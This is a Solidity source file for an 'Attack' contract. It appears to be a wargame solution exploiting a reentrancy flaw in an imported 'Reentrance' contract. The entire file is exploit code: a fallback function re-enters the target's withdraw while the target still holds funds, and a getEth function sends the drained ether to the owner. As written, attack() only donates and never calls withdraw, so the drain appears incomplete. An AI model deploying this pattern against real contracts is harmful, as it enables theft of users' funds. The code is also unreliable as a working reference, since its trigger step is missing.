//SPDX-License-Identifier:MIT

import "./Reentrance.sol";

pragma solidity ^0.8.0;

contract Attack{
    Reentrance public reentrance;
    address payable public owner;
    uint public amount = 0.001 ether;

    constructor(address payable _reentranceAddress) payable{
        reentrance = Reentrance(_reentranceAddress);
        owner = payable(msg.sender);
    }

    function attack() public payable{
        reentrance.donate{value:amount}(address(this));
    }

    function getEth() public{
        require(payable(msg.sender) == owner);
        owner.transfer(address(this).balance);
    }

    function checkBalances() view public returns(uint){
        return address(this).balance;
    }

    fallback() external payable{
        if(address(reentrance).balance != 0){
            reentrance.withdraw(amount);
        }
    }
}